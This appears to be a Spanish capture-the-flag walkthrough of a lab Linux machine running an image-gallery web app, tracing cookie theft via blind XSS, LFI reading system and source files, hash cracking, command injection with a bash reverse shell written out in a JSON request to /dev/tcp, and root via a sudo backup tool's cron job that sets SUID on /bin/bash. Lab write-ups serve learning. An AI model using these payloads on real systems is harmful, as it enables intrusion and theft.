
![](Assets/Attachments/Pasted%20image%2020260420112829.png)
Hacemos un ping y con el ttl nos damos cuenta de que se trata de una máquina Linux (64 -> Linux | 128 -> Windows).

![[Assets/Attachments/Pasted image 20260126115009.png]]

Hacemos un escaneo de puertos con nmap y lo exportamos todo en formato grepeable al archivo allPorts.

![[Assets/Attachments/Pasted image 20260126115141.png]]

Usamos la función extractPorts para extraer todos los puertos automáticamente y que se copien en el portapapeles.

![[Assets/Attachments/Pasted image 20260126115209.png]]

Hacemos otro escaneo para que nos dé información más exhaustiva sobre los puertos descubiertos y lo exportamos en formato nmap al archivo targeted.

Con el comando `cat targeted -l java` podemos ver el contenido del archivo con un formato más limpio.

![[Assets/Attachments/Pasted image 20260126115458.png]]

Mirando el escaneo, vemos que los puertos 22 (SSH) y 8000 (HTTP) están abiertos. Rápidamente nos damos cuenta de que no se aplica virtual hosting porque en el http_title vemos "Image Gallery", y la web está corriendo en un servidor Werkzeug 3.1.3 con Python 3.12.7.

![[Assets/Attachments/Pasted image 20260126115712.png]]

![[Assets/Attachments/Pasted image 20260126115728.png]]

![[Assets/Attachments/Pasted image 20260126115813.png]]

![[Assets/Attachments/Pasted image 20260126115823.png]]

Lo confirmamos accediendo desde el navegador a la IP 10.129.10.79:8000. ¡Ojo! Si vamos directamente a la IP sin especificar el puerto nos mostrará error, ya que por defecto HTTP va por el 80, así que hay que indicar el 8000.

![[Assets/Attachments/Pasted image 20260126120543.png]]

Ahora sí veremos la web.

![[Assets/Attachments/Pasted image 20260126120845.png]]

Echando un vistazo, es una aplicación que permite subir imágenes para almacenarlas en una galería personal. En el footer hay redes sociales que podrían darnos nombres de usuarios potenciales, pero solo recargan la página. También vemos un correo de contacto que nos apuntamos por si acaso.

![[Assets/Attachments/Pasted image 20260126121355.png]]

Pasamos Wappalyzer y WhatWeb para recopilar más información, pero no sacamos nada muy interesante.

![[Assets/Attachments/Pasted image 20260126121744.png]]

![[Assets/Attachments/Pasted image 20260126121828.png]]

Vamos a registrarnos y logearnos. Interceptamos la petición con BurpSuite usando FoxyProxy.

![[Assets/Attachments/Pasted image 20260126122516.png]]

![[Assets/Attachments/Pasted image 20260126122529.png]]

![[Assets/Attachments/Pasted image 20260126122535.png]]

Nos registramos correctamente.

![[Assets/Attachments/Pasted image 20260126123220.png]]

Tras el registro, iniciamos sesión sin problemas. En la respuesta del servidor vemos que nos asigna un ID y nos indica que no somos `admin` ni `testuser`. La lógica de inicio de sesión parece sólida y no es vulnerable a SQLi, por lo que descartamos atacar por esta vía.

![[Assets/Attachments/Pasted image 20260126123329.png]]

![[Assets/Attachments/Pasted image 20260126124014.png]]

Una vez dentro, la pestaña Gallery nos dice que no hay imágenes y nos manda a Upload.

![[Assets/Attachments/Pasted image 20260126124440.png]]

![[Assets/Attachments/Pasted image 20260126125010.png]]

La subida está restringida a imágenes de 1MB máximo en formatos estándar (JPG, PNG, GIF, BMP, TIFF), con campos opcionales para título, descripción y grupo. Al intentar usar "Add New Group", nos salta el mensaje: "Feature is still in development".

![[Assets/Attachments/Pasted image 20260126125329.png]]

Probamos a subir una imagen normal.

![[Assets/Attachments/Pasted image 20260126130312.png]]

Una vez subida, aparece en la galería. Al darle a los tres puntos, tenemos opciones, pero solo funcionan "Download" y "Delete".

![[Assets/Attachments/Pasted image 20260126130425.png]]

Al descargarla, vemos que el sistema le ha cambiado el nombre para identificarla.

![[Assets/Attachments/Pasted image 20260126130619.png]]

Por otro lado, en el footer hemos visto un apartado "Report Bug".

![[Assets/Attachments/Pasted image 20260126130056.png]]

![[Assets/Attachments/Pasted image 20260126130050.png]]

Si enviamos un reporte, nos dice que está en progreso para ser revisado por un administrador. Esto huele a posible XSS: podríamos intentar colar un script en los campos para ver si el admin lo ejecuta al revisarlo.

![[Assets/Attachments/Pasted image 20260126131110.png]]

![[Assets/Attachments/Pasted image 20260126131053.png]]

Antes de eso, fuzzeamos directorios con ffuf.

![[Assets/Attachments/Pasted image 20260126131807.png]]

Encontramos `/images`, así que entramos desde el navegador.

![[Assets/Attachments/Pasted image 20260126133153.png]]

Aquí se almacena la información de las imágenes subidas.

![[Assets/Attachments/Pasted image 20260126133452.png]]

Inspeccionando el HTML, notamos un `div` con `display: none` que parece ser el panel de administración. Le cambiamos el estilo a `display: flex` para forzar su visibilidad.

![[Assets/Attachments/Pasted image 20260126135137.png]]

Al no ser admins no cargan datos útiles, pero en la pestaña Debugger vemos rutas interesantes de la API.

![[Assets/Attachments/Pasted image 20260126135225.png]]

![[Assets/Attachments/Pasted image 20260126140625.png]]

Sacamos varios endpoints de `/admin/`:

![[Assets/Attachments/Pasted image 20260126140703.png]]

![[Assets/Attachments/Pasted image 20260126140716.png]]

![[Assets/Attachments/Pasted image 20260126140734.png]]

![[Assets/Attachments/Pasted image 20260126140742.png]]

![[Assets/Attachments/Pasted image 20260126140752.png]]

![[Assets/Attachments/Pasted image 20260126140838.png]]

No tenemos acceso a ninguna de ellas por falta de permisos, pero nos las guardamos. Como la subida de imágenes parece estar bien securizada, volvemos al "Report Bug" para intentar robar la cookie del administrador mediante un XSS ciego.

![[Assets/Attachments/Pasted image 20260126141854.png]]

Ponemos un netcat en escucha en el puerto 8000 (`nc -lvnp 8000`) y enviamos el payload.

![[Assets/Attachments/Pasted image 20260126142218.png]]

Tras unos segundos, recibimos la conexión con la cookie del admin.

![[Assets/Attachments/Pasted image 20260126142255.png]]

La copiamos, la sustituimos en el Storage del navegador, refrescamos con F5 y...

![[Assets/Attachments/Pasted image 20260126170624.png]]

Bingo, ya tenemos acceso al panel de administración.

![[Assets/Attachments/Pasted image 20260126170829.png]]

![[Assets/Attachments/Pasted image 20260126173328.png]]

Vemos a los usuarios `admin` y `testuser`, y los reportes de bugs. Si intentamos descargar los logs de `testuser` no nos deja.

![[Assets/Attachments/Pasted image 20260126173918.png]]

Pero los logs del administrador sí se pueden descargar. Aunque no hay credenciales a simple vista, vamos a interceptar la petición de descarga con BurpSuite.

![[Assets/Attachments/Pasted image 20260126174024.png]]

![[Assets/Attachments/Pasted image 20260126183558.png]]

Probamos a jugar con la ruta del archivo y Eureka: el parámetro es vulnerable a LFI (Local File Inclusion), lo que nos permite leer archivos del sistema.

![[Assets/Attachments/Pasted image 20260126184148.png]]

![[Assets/Attachments/Pasted image 20260126184217.png]]

![[Assets/Attachments/Pasted image 20260126184235.png]]

![[Assets/Attachments/Pasted image 20260126184244.png]]

Leemos el `/etc/passwd` y vemos los usuarios `web`, `mark` y `root`. Intentamos buscar claves SSH en las carpetas de `mark` o `web` pero no tenemos permisos de lectura.

![[Assets/Attachments/Pasted image 20260126184927.png]]

![[Assets/Attachments/Pasted image 20260126185000.png]]

Como no hay claves SSH, miramos en `/proc/self/environ` y confirmamos que el servidor corre bajo el usuario `web` en `/home/web/web`.

![[Assets/Attachments/Pasted image 20260126185129.png]]

Leemos el código fuente de la aplicación.

![[Assets/Attachments/Pasted image 20260126185837.png]]

En el archivo principal, nos fijamos en los módulos importados, como `api_admin.py`.

![[Assets/Attachments/Pasted image 20260126190134.png]]

Lo leemos también y vemos que importa cosas de `config.py` y `utils.py`.

![[Assets/Attachments/Pasted image 20260126190523.png]]

![[Assets/Attachments/Pasted image 20260126190905.png]]

Revisando `config.py`, encontramos referencias a otros archivos interesantes.

![[Assets/Attachments/Pasted image 20260126190953.png]]

Al leer `db.json`, descubrimos credenciales para `admin` y `testuser`.

![[Assets/Attachments/Pasted image 20260126191332.png]]

Están hasheadas en MD5 (confirmado con Name That Hash).

![[Assets/Attachments/Pasted image 20260126194211.png]]

Tiramos de Hashcat para romperlas.

![[Assets/Attachments/Pasted image 20260126194832.png]]

![[Assets/Attachments/Pasted image 20260126194851.png]]

El hash del admin no hay manera de sacarlo, probamos en Crackstation y tampoco.

![[Assets/Attachments/Pasted image 20260126195032.png]]

Sin embargo, el hash de `testuser` sí cae rápido: la contraseña es `iambatman`.

![[Assets/Attachments/Pasted image 20260126195204.png]]

Revisando el resto del código, en el archivo `api_edit.py`, vemos la función `apply_visual_transform`. En la lógica del `crop`, el sistema coge los parámetros (`x`, `y`, `width`, `height`), los pasa a string y los concatena directamente en un comando de ImageMagick (`convert`) que se ejecuta con `shell=True`. Al no estar sanitizados, podemos inyectar comandos directamente en cualquiera de esos campos.

El único requisito para acceder a esta función es ser `testuser` (el código lo valida al inicio de la ruta). Como ya tenemos la cuenta, nos logeamos. Ahora tenemos opciones extra como editar detalles, transformar imágenes y crear grupos.

![[Assets/Attachments/Pasted image 20260126202421.png]]

Subimos una imagen para tener un `imageId` válido y preparamos una petición POST a `/apply_visual_transform` interceptando con BurpSuite.

![[Assets/Attachments/Pasted image 20260126210258.png]]

Usamos la cookie de `testuser` y colamos nuestra reverse shell en el parámetro `height` separando el comando con un punto y coma.

JSON

```
{
    "imageId": "[ID_DE_LA_IMAGEN]",
    "transformType": "crop",
    "params": {
        "x": 10,
        "y": 10,
        "width": 100,
        "height": "100; bash -c 'bash -i >& /dev/tcp/10.10.14.58/4444 0>&1' #"
    }
}
```

Dejamos un netcat a la escucha en el puerto 4444, enviamos la petición y...

![[Assets/Attachments/Pasted image 20260126210620.png]]

Perfecto, ya tenemos una shell como el usuario `web`. Lo primero es estabilizarla:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![[Assets/Attachments/Pasted image 20260126212120.png]]

Pasamos a enumerar.

![[Assets/Attachments/Pasted image 20260126213447.png]]

No podemos hacer `sudo -l` porque no tenemos la contraseña de `web`, así que toca buscar otra forma de pivotar a `mark` o a `root`. Transferimos `pspy64` a la máquina víctima levantando un servidor con Python (`python3 -m http.server 80`) y descargándolo con `wget`.

![[Assets/Attachments/Pasted image 20260126214404.png]]

![[Assets/Attachments/Pasted image 20260126215635.png]]

Hacemos lo mismo con `linpeas.sh` para hacer una enumeración a fondo.

![[Assets/Attachments/Pasted image 20260126221753.png]]

![[Assets/Attachments/Pasted image 20260126221836.png]]

Revisando el output de Linpeas, en el apartado de backups encontramos un archivo muy jugoso: `web_20250806_120723.zip.aes`. Está encriptado con pyAesCrypt.

![[Assets/Attachments/Pasted image 20260126222225.png]]

Nos pasamos el archivo a nuestra máquina y usamos `dpyAesCrypt` (herramienta de GitHub) para reventar la contraseña por fuerza bruta.

![[Assets/Attachments/Pasted image 20260126222532.png]]

![[Assets/Attachments/Pasted image 20260126223303.png]]

Al rato nos saca la contraseña y nos descomprime el archivo.

![[Assets/Attachments/Pasted image 20260126223412.png]]

![[Assets/Attachments/Pasted image 20260126223643.png]]

Revisando los archivos extraídos, vemos un `db.json` antiguo que contiene hashes para `web` y `mark`. Rompemos el de `mark` y sacamos la contraseña: `supersmash`.

![[Assets/Attachments/Pasted image 20260126223914.png]]

Cambiamos al usuario `mark` con `su mark`, metemos la clave y leemos la primera flag.

![[Assets/Attachments/Pasted image 20260126224050.png]]

![[Assets/Attachments/Pasted image 20260126231109.png]]

Para la escalada final, hacemos `sudo -l` y vemos que `mark` puede ejecutar el binario `charcol` sin contraseña.

![[Assets/Attachments/Pasted image 20260126224153.png]]

Al ejecutar `sudo charcol shell` nos pide una contraseña maestra que no tenemos.

![[Assets/Attachments/Pasted image 20260126224908.png]]

![[Assets/Attachments/Pasted image 20260126225007.png]]

Mirando el menú de ayuda (`sudo charcol help`), vemos que con el flag `-R` podemos resetearla a la de por defecto.

![[Assets/Attachments/Pasted image 20260126225141.png]]

La reseteamos, entramos a la consola de charcol y configuramos el entorno (sin contraseña de app para ir rápido).

![[Assets/Attachments/Pasted image 20260126225323.png]]

![[Assets/Attachments/Pasted image 20260126225632.png]]

El objetivo de esta herramienta es hacer backups cifrados. Intentamos hacer un backup de `/root` para leer la flag, pero el programa bloquea el acceso por ser un directorio crítico.

![[Assets/Attachments/Pasted image 20260126230106.png]]

Mirando las opciones otra vez, vemos la función `auto add`, que sirve para automatizar tareas (cron). Esta función permite pasar el parámetro `--command`. La propia ayuda avisa que charcol no valida la seguridad del comando introducido. Como el binario corre con `sudo`, podemos inyectar un comando para que se ejecute como root.

Aprovechamos esto para crear un cronjob que le dé permisos SUID a la bash:

`auto add --schedule "* * * * *" --command "chmod 4755 /bin/bash" --name "root_shell"`

![[Assets/Attachments/Pasted image 20260126230727.png]]

Salimos de charcol con `exit`, esperamos un minuto para que salte el cron y verificamos los permisos de `/bin/bash`.

![[Assets/Attachments/Pasted image 20260126230915.png]]

Ya tiene la 's' del SUID. Lanzamos `/bin/bash -p` y ya somos root. Buscamos y leemos la flag final.

![[Assets/Attachments/Pasted image 20260126230953.png]]

![[Assets/Attachments/Pasted image 20260126231008.png]]